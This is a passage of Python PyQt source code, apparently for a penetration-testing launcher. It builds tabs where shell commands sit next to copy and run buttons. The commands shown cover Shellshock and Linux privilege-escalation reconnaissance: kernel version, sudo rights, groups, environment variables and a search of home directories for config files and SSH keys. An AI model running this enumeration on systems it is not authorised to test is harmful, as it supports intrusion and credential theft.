        self.shellshockExploit_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # shellshockExploit_Scan2 copy button
        if hasattr(self, 'shellshockExploit_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2_Copy)
            self.shellshockExploit_Scan2_Copy.deleteLater()
        self.shellshockExploit_Scan2_Copy = QPushButton()
        self.shellshockExploit_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.shellshockExploit_Scan2_Copy.setFixedSize(QSize(20,20))
        self.shellshockExploit_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockExploit_Scan2.text()))
        self.shellshockExploit_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan2 run button
        if hasattr(self, 'shellshockExploit_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2_Run)
            self.shellshockExploit_Scan2_Run.deleteLater()
        self.shellshockExploit_Scan2_Run = QPushButton()
        self.shellshockExploit_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.shellshockExploit_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.shellshockExploit_Scan2.text() + "; bash"
        self.shellshockExploit_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.shellshockExploit_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.shellshockExploit_Scan2_Copy)
        label_layout.addWidget(self.shellshockExploit_Scan2_Run)
        label_layout.addWidget(self.shellshockExploit_Scan2)
        self.tab2_container_layout.insertLayout(87, label_layout)
        self.tab2_container_layout.addStretch()

         # shellshock_divider 1
        if hasattr(self, 'shellshock_divider1'):
            self.tab2_container_layout.removeWidget(self.shellshock_divider1)
            self.shellshock_divider1.deleteLater()
        self.shellshock_divider1 = QFrame()
        self.shellshock_divider1.setFrameShape(QFrame.HLine)
        self.shellshock_divider1.setLineWidth(3)
        self.shellshock_divider1.setStyleSheet("color: #20C20E;")
        
        # shellshock_divider2
        if hasattr(self, 'shellshock_divider2'):
            self.tab2_container_layout.removeWidget(self.shellshock_divider2)
            self.shellshock_divider2.deleteLater()
        self.shellshock_divider2 = QFrame()
        self.shellshock_divider2.setFrameShape(QFrame.HLine)
        self.shellshock_divider2.setLineWidth(3)
        self.shellshock_divider2.setStyleSheet("color: #20C20E;")
        
        # shellshock_spacer1
        if hasattr(self, 'shellshock_spacer1'):
            self.tab2_container_layout.removeWidget(self.shellshock_spacer1)
            self.shellshock_spacer1.deleteLater()
        self.shellshock_spacer1 = QLabel()
        self.shellshock_spacer1.setFixedWidth(40)
        self.shellshock_spacer1.setFixedHeight(50)
        
        # shellshock_spacer2
        if hasattr(self, 'shellshock_spacer2'):
            self.tab2_container_layout.removeWidget(self.shellshock_spacer2)
            self.shellshock_spacer2.deleteLater()
        self.shellshock_spacer2 = QLabel()
        self.shellshock_spacer2.setFixedWidth(40)
        self.shellshock_spacer2.setFixedHeight(50)

        # shellshock_spacer & divider layout
        self.tab2_container_layout.insertWidget(88, self.shellshock_spacer1)
        self.tab2_container_layout.insertWidget(89, self.shellshock_divider1)
        self.tab2_container_layout.insertWidget(90, self.shellshock_divider2)
        self.tab2_container_layout.insertWidget(91, self.shellshock_spacer2)
        self.tab2_container_layout.addStretch()

##### LPE
    def lpe(self):
        if not hasattr(self, 'tab3_container'):
            self.tab3_container = QWidget()
            self.tab3_container_layout = QVBoxLayout(self.tab3_container)
            self.tab3_container.setLayout(self.tab3_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab3_container)
            self.scroll.setWidgetResizable(True)
            self.tab3_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab3_container_layout.setContentsMargins(0,0,0,0)
            self.tab3_container.adjustSize()
            self.tab3.setLayout(QVBoxLayout())
            self.tab3.layout().addWidget(self.scroll)

        # lpe_top_divider 1
        if hasattr(self, 'lpe_top_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_top_divider1)
            self.lpe_top_divider1.deleteLater()
        self.lpe_top_divider1 = QFrame()
        self.lpe_top_divider1.setFrameShape(QFrame.HLine)
        self.lpe_top_divider1.setLineWidth(3)
        self.lpe_top_divider1.setStyleSheet("color: #20C20E;")

        # lpe_top_divider2
        if hasattr(self, 'lpe_top_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_top_divider2)
            self.lpe_top_divider2.deleteLater()
        self.lpe_top_divider2 = QFrame()
        self.lpe_top_divider2.setFrameShape(QFrame.HLine)
        self.lpe_top_divider2.setLineWidth(3)
        self.lpe_top_divider2.setStyleSheet("color: #20C20E;")

        # lpe_top_spacer1
        if hasattr(self, 'lpe_top_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_top_spacer1)
            self.lpe_top_spacer1.deleteLater()
        self.lpe_top_spacer1 = QLabel()
        self.lpe_top_spacer1.setFixedWidth(40)
        self.lpe_top_spacer1.setFixedHeight(50)

        # lpe_top_spacer & divider layout
        self.tab3_container_layout.insertWidget(1, self.lpe_top_divider1)
        self.tab3_container_layout.insertWidget(2, self.lpe_top_divider2)
        self.tab3_container_layout.insertWidget(3, self.lpe_top_spacer1)
        self.tab3_container_layout.addStretch()

# kernel
        if hasattr(self, 'kernel'):
            self.tab3_container_layout.removeWidget(self.kernel)
            self.kernel.deleteLater()
        self.kernel = QLabel("[+ Kernel Exploits - Last Resort]")
        self.kernel.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(4,self.kernel)

        # kernel_Scan1
        if hasattr(self, 'kernel_Scan1'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan1)
            self.kernel_Scan1.deleteLater()
        self.kernel_Scan1 = QLabel("file /bin/bash")
        self.kernel_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # kernel_Scan1 copy button
        if hasattr(self, 'kernel_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan1_Copy)
            self.kernel_Scan1_Copy.deleteLater()
        self.kernel_Scan1_Copy = QPushButton()
        self.kernel_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.kernel_Scan1_Copy.setFixedSize(QSize(20,20))
        self.kernel_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.kernel_Scan1.text()))
        self.kernel_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan1 run button
        if hasattr(self, 'kernel_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan1_Run)
            self.kernel_Scan1_Run.deleteLater()
        self.kernel_Scan1_Run = QPushButton()
        self.kernel_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.kernel_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.kernel_Scan1.text() + "; bash"
        self.kernel_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.kernel_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.kernel_Scan1_Copy)
        label_layout.addWidget(self.kernel_Scan1_Run)
        label_layout.addWidget(self.kernel_Scan1)
        self.tab3_container_layout.insertLayout(5, label_layout)
        self.tab3_container_layout.addStretch()

        # kernel_Scan2
        if hasattr(self, 'kernel_Scan2'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan2)
            self.kernel_Scan2.deleteLater()
        self.kernel_Scan2 = QLabel("uname -a")
        self.kernel_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # kernel_Scan2 copy button
        if hasattr(self, 'kernel_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan2_Copy)
            self.kernel_Scan2_Copy.deleteLater()
        self.kernel_Scan2_Copy = QPushButton()
        self.kernel_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.kernel_Scan2_Copy.setFixedSize(QSize(20,20))
        self.kernel_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.kernel_Scan2.text()))
        self.kernel_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan2 run button
        if hasattr(self, 'kernel_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan2_Run)
            self.kernel_Scan2_Run.deleteLater()
        self.kernel_Scan2_Run = QPushButton()
        self.kernel_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.kernel_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.kernel_Scan2.text() + "; bash"
        self.kernel_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.kernel_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.kernel_Scan2_Copy)
        label_layout.addWidget(self.kernel_Scan2_Run)
        label_layout.addWidget(self.kernel_Scan2)
        self.tab3_container_layout.insertLayout(6, label_layout)
        self.tab3_container_layout.addStretch()

        # kernel_Scan3
        if hasattr(self, 'kernel_Scan3'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan3)
            self.kernel_Scan3.deleteLater()
        self.kernel_Scan3 = QLabel("cat /etc/*-release")
        self.kernel_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # kernel_Scan3 copy button
        if hasattr(self, 'kernel_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan3_Copy)
            self.kernel_Scan3_Copy.deleteLater()
        self.kernel_Scan3_Copy = QPushButton()
        self.kernel_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.kernel_Scan3_Copy.setFixedSize(QSize(20,20))
        self.kernel_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.kernel_Scan3.text()))
        self.kernel_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan3 run button
        if hasattr(self, 'kernel_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan3_Run)
            self.kernel_Scan3_Run.deleteLater()
        self.kernel_Scan3_Run = QPushButton()
        self.kernel_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.kernel_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.kernel_Scan3.text() + "; bash"
        self.kernel_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.kernel_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.kernel_Scan3_Copy)
        label_layout.addWidget(self.kernel_Scan3_Run)
        label_layout.addWidget(self.kernel_Scan3)
        self.tab3_container_layout.insertLayout(7, label_layout)
        self.tab3_container_layout.addStretch()

        # kernel_Scan4
        if hasattr(self, 'kernel_Scan4'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan4)
            self.kernel_Scan4.deleteLater()
        self.kernel_Scan4 = QLabel("cat /etc/issue")
        self.kernel_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # kernel_Scan4 copy button
        if hasattr(self, 'kernel_Scan4_Copy'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan4_Copy)
            self.kernel_Scan4_Copy.deleteLater()
        self.kernel_Scan4_Copy = QPushButton()
        self.kernel_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.kernel_Scan4_Copy.setFixedSize(QSize(20,20))
        self.kernel_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.kernel_Scan4.text()))
        self.kernel_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan4 run button
        if hasattr(self, 'kernel_Scan4_Run'):
            self.tab3_container_layout.removeWidget(self.kernel_Scan4_Run)
            self.kernel_Scan4_Run.deleteLater()
        self.kernel_Scan4_Run = QPushButton()
        self.kernel_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.kernel_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.kernel_Scan4.text() + "; bash"
        self.kernel_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.kernel_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # kernel_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.kernel_Scan4_Copy)
        label_layout.addWidget(self.kernel_Scan4_Run)
        label_layout.addWidget(self.kernel_Scan4)
        self.tab3_container_layout.insertLayout(8, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_kernel_divider 1
        if hasattr(self, 'lpe_kernel_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_kernel_divider1)
            self.lpe_kernel_divider1.deleteLater()
        self.lpe_kernel_divider1 = QFrame()
        self.lpe_kernel_divider1.setFrameShape(QFrame.HLine)
        self.lpe_kernel_divider1.setLineWidth(3)
        self.lpe_kernel_divider1.setStyleSheet("color: #20C20E;")

        # lpe_kernel_divider2
        if hasattr(self, 'lpe_kernel_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_kernel_divider2)
            self.lpe_kernel_divider2.deleteLater()
        self.lpe_kernel_divider2 = QFrame()
        self.lpe_kernel_divider2.setFrameShape(QFrame.HLine)
        self.lpe_kernel_divider2.setLineWidth(3)
        self.lpe_kernel_divider2.setStyleSheet("color: #20C20E;")

        # lpe_kernel_spacer1
        if hasattr(self, 'lpe_kernel_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_kernel_spacer1)
            self.lpe_kernel_spacer1.deleteLater()
        self.lpe_kernel_spacer1 = QLabel()
        self.lpe_kernel_spacer1.setFixedWidth(40)
        self.lpe_kernel_spacer1.setFixedHeight(50)

        # lpe_kernel_spacer2
        if hasattr(self, 'lpe_kernel_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_kernel_spacer2)
            self.lpe_kernel_spacer2.deleteLater()
        self.lpe_kernel_spacer2 = QLabel()
        self.lpe_kernel_spacer2.setFixedWidth(40)
        self.lpe_kernel_spacer2.setFixedHeight(50)

        # lpe_kernel_spacer & divider layout
        self.tab3_container_layout.insertWidget(9, self.lpe_kernel_spacer1)
        self.tab3_container_layout.insertWidget(10, self.lpe_kernel_divider1)
        self.tab3_container_layout.insertWidget(11, self.lpe_kernel_divider2)
        self.tab3_container_layout.insertWidget(12, self.lpe_kernel_spacer2)
        self.tab3_container_layout.addStretch()

# sudoer
        if hasattr(self, 'sudoer'):
            self.tab3_container_layout.removeWidget(self.sudoer)
            self.sudoer.deleteLater()
        self.sudoer = QLabel("[+ Sudoer]")
        self.sudoer.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(13,self.sudoer)

        # sudoer_Scan1
        if hasattr(self, 'sudoer_Scan1'):
            self.tab3_container_layout.removeWidget(self.sudoer_Scan1)
            self.sudoer_Scan1.deleteLater()
        self.sudoer_Scan1 = QLabel(f"sudo -l")
        self.sudoer_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # sudoer_Scan1 copy button
        if hasattr(self, 'sudoer_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.sudoer_Scan1_Copy)
            self.sudoer_Scan1_Copy.deleteLater()
        self.sudoer_Scan1_Copy = QPushButton()
        self.sudoer_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.sudoer_Scan1_Copy.setFixedSize(QSize(20,20))
        self.sudoer_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.sudoer_Scan1.text()))
        self.sudoer_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # sudoer_Scan1 run button
        if hasattr(self, 'sudoer_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.sudoer_Scan1_Run)
            self.sudoer_Scan1_Run.deleteLater()
        self.sudoer_Scan1_Run = QPushButton()
        self.sudoer_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.sudoer_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.sudoer_Scan1.text() + "; bash"
        self.sudoer_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.sudoer_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # sudoer_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.sudoer_Scan1_Copy)
        label_layout.addWidget(self.sudoer_Scan1_Run)
        label_layout.addWidget(self.sudoer_Scan1)
        self.tab3_container_layout.insertLayout(14, label_layout)
        self.tab3_container_layout.addStretch()

        # sudoer_Scan2
        if hasattr(self, 'sudoer_Scan2'):
            self.tab3_container_layout.removeWidget(self.sudoer_Scan2)
            self.sudoer_Scan2.deleteLater()
        self.sudoer_Scan2 = QLabel(f"ls -lsaht /etc/sudoers")
        self.sudoer_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # sudoer_Scan2 copy button
        if hasattr(self, 'sudoer_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.sudoer_Scan2_Copy)
            self.sudoer_Scan2_Copy.deleteLater()
        self.sudoer_Scan2_Copy = QPushButton()
        self.sudoer_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.sudoer_Scan2_Copy.setFixedSize(QSize(20,20))
        self.sudoer_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.sudoer_Scan2.text()))
        self.sudoer_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # sudoer_Scan2 run button
        if hasattr(self, 'sudoer_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.sudoer_Scan2_Run)
            self.sudoer_Scan2_Run.deleteLater()
        self.sudoer_Scan2_Run = QPushButton()
        self.sudoer_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.sudoer_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.sudoer_Scan2.text() + "; bash"
        self.sudoer_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.sudoer_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # sudoer_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.sudoer_Scan2_Copy)
        label_layout.addWidget(self.sudoer_Scan2_Run)
        label_layout.addWidget(self.sudoer_Scan2)
        self.tab3_container_layout.insertLayout(15, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_sudoer_divider 1
        if hasattr(self, 'lpe_sudoer_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_sudoer_divider1)
            self.lpe_sudoer_divider1.deleteLater()
        self.lpe_sudoer_divider1 = QFrame()
        self.lpe_sudoer_divider1.setFrameShape(QFrame.HLine)
        self.lpe_sudoer_divider1.setLineWidth(3)
        self.lpe_sudoer_divider1.setStyleSheet("color: #20C20E;")

        # lpe_sudoer_divider2
        if hasattr(self, 'lpe_sudoer_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_sudoer_divider2)
            self.lpe_sudoer_divider2.deleteLater()
        self.lpe_sudoer_divider2 = QFrame()
        self.lpe_sudoer_divider2.setFrameShape(QFrame.HLine)
        self.lpe_sudoer_divider2.setLineWidth(3)
        self.lpe_sudoer_divider2.setStyleSheet("color: #20C20E;")

        # lpe_sudoer_spacer1
        if hasattr(self, 'lpe_sudoer_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_sudoer_spacer1)
            self.lpe_sudoer_spacer1.deleteLater()
        self.lpe_sudoer_spacer1 = QLabel()
        self.lpe_sudoer_spacer1.setFixedWidth(40)
        self.lpe_sudoer_spacer1.setFixedHeight(50)

        # lpe_sudoer_spacer2
        if hasattr(self, 'lpe_sudoer_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_sudoer_spacer2)
            self.lpe_sudoer_spacer2.deleteLater()
        self.lpe_sudoer_spacer2 = QLabel()
        self.lpe_sudoer_spacer2.setFixedWidth(40)
        self.lpe_sudoer_spacer2.setFixedHeight(50)

        # lpe_sudoer_spacer & divider layout
        self.tab3_container_layout.insertWidget(16, self.lpe_sudoer_spacer1)
        self.tab3_container_layout.insertWidget(17, self.lpe_sudoer_divider1)
        self.tab3_container_layout.insertWidget(18, self.lpe_sudoer_divider2)
        self.tab3_container_layout.insertWidget(19, self.lpe_sudoer_spacer2)
        self.tab3_container_layout.addStretch()

# groups
        if hasattr(self, 'groups'):
            self.tab3_container_layout.removeWidget(self.groups)
            self.groups.deleteLater()
        self.groups = QLabel("[+ Any Special Groups]")
        self.groups.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(20,self.groups)

        # groups_Scan1
        if hasattr(self, 'groups_Scan1'):
            self.tab3_container_layout.removeWidget(self.groups_Scan1)
            self.groups_Scan1.deleteLater()
        self.groups_Scan1 = QLabel(f"groups <user>")
        self.groups_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # groups_Scan1 copy button
        if hasattr(self, 'groups_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.groups_Scan1_Copy)
            self.groups_Scan1_Copy.deleteLater()
        self.groups_Scan1_Copy = QPushButton()
        self.groups_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.groups_Scan1_Copy.setFixedSize(QSize(20,20))
        self.groups_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.groups_Scan1.text()))
        self.groups_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # groups_Scan1 run button
        if hasattr(self, 'groups_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.groups_Scan1_Run)
            self.groups_Scan1_Run.deleteLater()
        self.groups_Scan1_Run = QPushButton()
        self.groups_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.groups_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.groups_Scan1.text() + "; bash"
        self.groups_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.groups_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # groups_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.groups_Scan1_Copy)
        label_layout.addWidget(self.groups_Scan1_Run)
        label_layout.addWidget(self.groups_Scan1)
        self.tab3_container_layout.insertLayout(21, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_groups_divider 1
        if hasattr(self, 'lpe_groups_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_groups_divider1)
            self.lpe_groups_divider1.deleteLater()
        self.lpe_groups_divider1 = QFrame()
        self.lpe_groups_divider1.setFrameShape(QFrame.HLine)
        self.lpe_groups_divider1.setLineWidth(3)
        self.lpe_groups_divider1.setStyleSheet("color: #20C20E;")

        # lpe_groups_divider2
        if hasattr(self, 'lpe_groups_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_groups_divider2)
            self.lpe_groups_divider2.deleteLater()
        self.lpe_groups_divider2 = QFrame()
        self.lpe_groups_divider2.setFrameShape(QFrame.HLine)
        self.lpe_groups_divider2.setLineWidth(3)
        self.lpe_groups_divider2.setStyleSheet("color: #20C20E;")

        # lpe_groups_spacer1
        if hasattr(self, 'lpe_groups_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_groups_spacer1)
            self.lpe_groups_spacer1.deleteLater()
        self.lpe_groups_spacer1 = QLabel()
        self.lpe_groups_spacer1.setFixedWidth(40)
        self.lpe_groups_spacer1.setFixedHeight(50)

        # lpe_groups_spacer2
        if hasattr(self, 'lpe_groups_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_groups_spacer2)
            self.lpe_groups_spacer2.deleteLater()
        self.lpe_groups_spacer2 = QLabel()
        self.lpe_groups_spacer2.setFixedWidth(40)
        self.lpe_groups_spacer2.setFixedHeight(50)

        # lpe_groups_spacer & divider layout
        self.tab3_container_layout.insertWidget(22, self.lpe_groups_spacer1)
        self.tab3_container_layout.insertWidget(23, self.lpe_groups_divider1)
        self.tab3_container_layout.insertWidget(24, self.lpe_groups_divider2)
        self.tab3_container_layout.insertWidget(25, self.lpe_groups_spacer2)
        self.tab3_container_layout.addStretch()

# env
        if hasattr(self, 'env'):
            self.tab3_container_layout.removeWidget(self.env)
            self.env.deleteLater()
        self.env = QLabel("[+ Environment Variables]")
        self.env.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(26,self.env)

        # env_Scan1
        if hasattr(self, 'env_Scan1'):
            self.tab3_container_layout.removeWidget(self.env_Scan1)
            self.env_Scan1.deleteLater()
        self.env_Scan1 = QLabel("env")
        self.env_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # env_Scan1 copy button
        if hasattr(self, 'env_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.env_Scan1_Copy)
            self.env_Scan1_Copy.deleteLater()
        self.env_Scan1_Copy = QPushButton()
        self.env_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.env_Scan1_Copy.setFixedSize(QSize(20,20))
        self.env_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.env_Scan1.text()))
        self.env_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # env_Scan1 run button
        if hasattr(self, 'env_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.env_Scan1_Run)
            self.env_Scan1_Run.deleteLater()
        self.env_Scan1_Run = QPushButton()
        self.env_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.env_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.env_Scan1.text() + "; bash"
        self.env_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.env_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # env_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.env_Scan1_Copy)
        label_layout.addWidget(self.env_Scan1_Run)
        label_layout.addWidget(self.env_Scan1)
        self.tab3_container_layout.insertLayout(27, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_env_divider 1
        if hasattr(self, 'lpe_env_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_env_divider1)
            self.lpe_env_divider1.deleteLater()
        self.lpe_env_divider1 = QFrame()
        self.lpe_env_divider1.setFrameShape(QFrame.HLine)
        self.lpe_env_divider1.setLineWidth(3)
        self.lpe_env_divider1.setStyleSheet("color: #20C20E;")

        # lpe_env_divider2
        if hasattr(self, 'lpe_env_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_env_divider2)
            self.lpe_env_divider2.deleteLater()
        self.lpe_env_divider2 = QFrame()
        self.lpe_env_divider2.setFrameShape(QFrame.HLine)
        self.lpe_env_divider2.setLineWidth(3)
        self.lpe_env_divider2.setStyleSheet("color: #20C20E;")

        # lpe_env_spacer1
        if hasattr(self, 'lpe_env_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_env_spacer1)
            self.lpe_env_spacer1.deleteLater()
        self.lpe_env_spacer1 = QLabel()
        self.lpe_env_spacer1.setFixedWidth(40)
        self.lpe_env_spacer1.setFixedHeight(50)

        # lpe_env_spacer2
        if hasattr(self, 'lpe_env_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_env_spacer2)
            self.lpe_env_spacer2.deleteLater()
        self.lpe_env_spacer2 = QLabel()
        self.lpe_env_spacer2.setFixedWidth(40)
        self.lpe_env_spacer2.setFixedHeight(50)

        # lpe_env_spacer & divider layout
        self.tab3_container_layout.insertWidget(28, self.lpe_env_spacer1)
        self.tab3_container_layout.insertWidget(29, self.lpe_env_divider1)
        self.tab3_container_layout.insertWidget(30, self.lpe_env_divider2)
        self.tab3_container_layout.insertWidget(31, self.lpe_env_spacer2)
        self.tab3_container_layout.addStretch()

# home
        if hasattr(self, 'home'):
            self.tab3_container_layout.removeWidget(self.home)
            self.home.deleteLater()
        self.home = QLabel("[+ Any .conf, ssh keys, other Interesting files in Users Home Directory??]")
        self.home.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(32,self.home)

        # home_Scan1
        if hasattr(self, 'home_Scan1'):
            self.tab3_container_layout.removeWidget(self.home_Scan1)
            self.home_Scan1.deleteLater()
        self.home_Scan1 = QLabel(f"ls -lsaR /home/ 2>/dev/null")
        self.home_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

